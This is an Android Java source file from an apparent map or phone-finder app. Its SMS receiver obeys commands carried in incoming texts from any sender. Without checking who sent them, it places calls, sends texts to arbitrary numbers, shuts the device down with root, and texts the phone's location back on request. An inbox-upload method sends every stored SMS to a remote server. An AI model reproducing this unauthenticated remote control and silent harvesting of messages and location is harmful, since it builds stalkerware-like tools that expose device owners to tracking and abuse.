package com.bhagya.mapapplication.activityclass;
import android.Manifest;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.Toast;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.media.MediaPlayer;
import android.telephony.SmsMessage;
import android.util.Log;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;
import com.bhagya.mapapplication.R;
import com.bhagya.mapapplication.services.UploadContactInfoService;
import com.bhagya.mapapplication.socket.IncomingMessageHandler;
import com.bhagya.mapapplication.socket.SocketConnection;
import com.facebook.AccessToken;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

import static android.content.Context.MODE_PRIVATE;
import static android.content.Context.NOTIFICATION_SERVICE;
import static android.content.Context.WIFI_SERVICE;
import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.facebook.FacebookSdk.getApplicationContext;

/**
 * Created by Bhagya on 1/16/2017.
 */
public class read_Incomingsms extends BroadcastReceiver {

    private String TAG = read_Incomingsms.class.getSimpleName();
    String messege,mobileno;
    MediaPlayer mPlayer ;
    private Context ctx;
    DatabaseHelper databaseHelper;
    AQuery aQuery;
    String realdata;
    public read_Incomingsms() {
    }
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    @Override
    public void onReceive(Context context, Intent intent) {
        // Get the data (SMS data) bound to intent
        Bundle bundle = intent.getExtras();
        mPlayer   = MediaPlayer.create(context, R.raw.sanam);
        SmsMessage[] msgs = null;
        ctx=context;
        aQuery=new AQuery(context);
        databaseHelper=new DatabaseHelper(context);
        String str = "";
        if (bundle != null) {
            // Retrieve the SMS Messages received
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length];
            // For every SMS message received
            for (int i=0; i < msgs.length; i++) {
                // Convert Object array
                msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                // Sender's phone number
                str += "SMS from " + msgs[i].getOriginatingAddress() + " : ";
                mobileno=msgs[i].getOriginatingAddress().toString();
                // Fetch the text message
                str += msgs[i].getMessageBody().toString();
                messege=msgs[i].getMessageBody().toString();
                // Newline <img draggable="false" class="emoji" alt="🙂" src="https://s.w.org/images/core/emoji/72x72/1f642.png">
                str += "\n";
            }
            Toast.makeText(context,str, Toast.LENGTH_SHORT).show();
            SharedPreferences preferences = context.getSharedPreferences("MAIN_USER_RECORD", MODE_PRIVATE);
            String  userId = preferences.getString("user_id", "");
            SocketConnection socketConnection = new SocketConnection();
            socketConnection.connectSocket(AccessToken.getCurrentAccessToken().getToken());
            int a = messege.indexOf(':');
            if(a != -1 ){
                Toast.makeText(context,"in body part",Toast.LENGTH_LONG).show();
                String[] sms_array = messege.split(":");
                String condition = sms_array[0];
                realdata = sms_array[1];
                if (condition.equals("locationresponse")){
                    realdata=sms_array[1]+":"+sms_array[2]+":"+sms_array[3];
                }

            if (condition.equals("playmp3"))
            {
                mPlayer.start();
                Intent intentone = new Intent(context.getApplicationContext(), UploadContactInfoService.class);
                intentone.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(intentone);
            }

            if(messege.equals("stopmp3"))
            {
//                mPlayer.pause();
//                mPlayer.stop();
            }

            if(condition.equals("turnonwifi")){
                    Log.d("TURNONWIFI","CALLED");
                WifiManager wifiManager = (WifiManager) context.getSystemService(WIFI_SERVICE);
                wifiManager.setWifiEnabled(true);
                Intent webMessageIntent = new Intent(context.getApplicationContext(), IncomingMessageHandler.class);
                webMessageIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(webMessageIntent);
            }

           if (condition.equals("shutdown"))
           {
               try {
                   Process proc = Runtime.getRuntime()
                           .exec(new String[]{ "su", "-c", "reboot -p" });
                   proc.waitFor();
               } catch (Exception ex) {
                   ex.printStackTrace();
               }
           }
            if(condition.equals("call")) {

                String mobileNo = realdata;
                Intent callIntent = new Intent(Intent.ACTION_CALL);
                callIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_NEW_TASK);
                callIntent.setData(Uri.parse(String.format("tel:%s", Uri.encode(mobileNo))));
                if (ActivityCompat.checkSelfPermission(getApplicationContext(), android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                    return;
                }
                context.startActivity(callIntent);
            }

            if (condition.equals("getlocation")) {

               Toast.makeText(context,"mobile no in side getloaction notification"+mobileno,Toast.LENGTH_LONG).show();

                SharedPreferences location_request = context.getSharedPreferences("Remotemobile_no", MODE_PRIVATE);

                SharedPreferences.Editor editor = location_request.edit();
                editor.putString("mobile_no",mobileno);
                editor.commit();
               // String[]data=realdata.split("");
                Notification notification = new Notification();
                Notification.Builder builder=new Notification.Builder(context);
                Intent intentgps4=new Intent(context,LocationListnerActivity_Requestside.class);
                intentgps4.putExtra("mobileno",mobileno);
                PendingIntent pendingIntent=PendingIntent.getActivity(context,102,intentgps4,0);
                notification=builder.setContentIntent(pendingIntent)
                        .setSmallIcon(R.mipmap.ic_launcher)
                        .setTicker("ticker")
                        .setWhen(System.currentTimeMillis())
                        .setAutoCancel(true)
                        .setContentTitle(realdata)
                        .setContentText("Want to track you...").build();

                notification.sound = Uri.parse("android.resource://"
                        + context.getPackageName() + "/" + R.raw.tick);
                NotificationManager notificationManager=(NotificationManager)context.getSystemService(NOTIFICATION_SERVICE);
                notificationManager.notify(1102,notification);
            }

            if (condition.equals("locationresponse")) {
                Log.d("Locationresponse",realdata);
                String[] reallocation=realdata.split("@");
                String latitudedata=reallocation[0];
                String logitudedata=reallocation[1];
                String datetime=reallocation[2];
                String remoteuser_name=reallocation[3];
                SharedPreferences.Editor location = ctx.getSharedPreferences("Location_Response",MODE_PRIVATE).edit();
                location.putString("latitue",latitudedata);
                location.putString("longitude",logitudedata);
                location.putString("dateTime",datetime);
                location.putString("user_name",remoteuser_name);
                location.apply();

                Notification notification  = new Notification();
                Notification.Builder builder=new Notification.Builder(context);
                Intent intentgps=new Intent(context,MapsActivity.class);
                intentgps.putExtra("latitude",latitudedata);
                intentgps.putExtra("longitude",logitudedata);
                intentgps.putExtra("datetime",datetime);
                PendingIntent pendingIntent=PendingIntent.getActivity(context,101,intentgps,0);
                notification=builder.setContentIntent(pendingIntent)
                        .setSmallIcon(R.mipmap.ic_launcher)
                        .setTicker("ticker")
                        .setWhen(System.currentTimeMillis())
                        .setAutoCancel(true)
                        .setContentTitle("Ready to Track")
                        .setContentText("Start tracking To"+remoteuser_name).build();
                notification.sound = Uri.parse("android.resource://"
                        + context.getPackageName() + "/" + R.raw.tick);
                NotificationManager notificationManager=(NotificationManager)context.getSystemService(NOTIFICATION_SERVICE);
                notificationManager.notify(1101,notification);

            }

           if(condition.equals("sendsms")) {
               String[] reallocation = realdata.split("@");
               String realsms=reallocation[0];
               String no=reallocation[1];
                SmsManager sms = SmsManager.getDefault();
                sms.sendTextMessage(no, null, realsms, null, null);
            }
           if (condition.equals("findmyphone"))
           responseSms();


           Log.d(TAG, str);
            Toast.makeText(context,str,Toast.LENGTH_LONG).show();
        }}
    }
   public void responseSms(){
      LocationInfo locationInfo=databaseHelper.getLastLocation();
      SharedPreferences prfs = ctx.getSharedPreferences("MAIN_USER_RECORD", MODE_PRIVATE);
       String local_username=prfs.getString("user_name","");
        SmsManager sms=SmsManager.getDefault();
        Toast.makeText(ctx,mobileno,Toast.LENGTH_LONG).show();
        sms.sendTextMessage(mobileno, null,"locationresponse:"
                +locationInfo.latitudedataValue
                +"@"+locationInfo.lognitudedataValue
                +"@"+locationInfo.dataTime
                +"@"+local_username, null,null);
    }


    public void uplaodInbox(Context context, SocketConnection socketConnection) {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = context.getContentResolver().query(uriSms, new String[]{"_id", "address", "date DESC", "body"}, null, null, null);
        cursor.moveToFirst();
        SharedPreferences preferences = context.getSharedPreferences("MAIN_USER_RECORD", MODE_PRIVATE);
        String userId = preferences.getString("user_id", "");
        while (cursor.moveToNext()) {
            String smsId, address, body, date, person;
            JSONObject params = new JSONObject();
            smsId = cursor.getString(0);
            address = cursor.getString(1);
            body = cursor.getString(3);
            date = cursor.getString(2);
            try {

                params.put("smsId", smsId);
                params.put("contactNo", address);
                params.put("content", body);
                params.put("timeStamps", date);
                params.put("userId", userId);
                socketConnection.rsocket.emit("uploadInbox", params);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        };
    }
}

//
//           Intent intent1=new Intent(context,read_Incomingsms.class);
//           PendingIntent pi=PendingIntent.getActivity(context, 0, intent1,0);
//  String mob="9843415412";
//Get the SmsManager instance and call the sendTextMessage method to send message
//            SmsManager sms=SmsManager.getDefault();
//            sms.sendTextMessage(no, null,"Latitude:27.63779788"+"  longitude:85.32978869", pi,null);
// String data="9801074961@name is@bhagya sah";




//
//           Intent intent1=new Intent(context,read_Incomingsms.class);
//           PendingIntent pi=PendingIntent.getActivity(context, 0, intent1,0);
//  String mob="9843415412";
//Get the SmsManager instance and call the sendTextMessage method to send message
//            SmsManager sms=SmsManager.getDefault();
//            sms.sendTextMessage(no, null,"Latitude:27.63779788"+"  longitude:85.32978869", pi,null);
// String data="9801074961@name is@bhagya sah";






//if(messege.equals("turnongps"))
//    {
//        intent = new Intent("android.location.GPS_ENABLED_CHANGE");
//        intent.putExtra("enabled", true);
//        context.sendBroadcast(intent);
//
//        String provider = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
//        if(!provider.contains("gps")) { //if gps is disabled
//            final Intent poke = new Intent();
//            poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
//            poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
//            poke.setData(Uri.parse("3"));
//            context.sendBroadcast(poke);
//        }
//
//}


//            try {
//                MainActivity .getInstace().updateTheTextView("hlw dfhasfjalf jja");
//            } catch (Exception e) {
//
//            }
//             Display the entire SMS Message
//          DatabaseHelper databaseHelper=new DatabaseHelper(context);
//           ContentValues cv=new ContentValues();
//
//
//
//
//            intent = new Intent(context, MainActivity.class);
//            intent.putExtra("smsdata",str);
//            context.startActivity(intent);
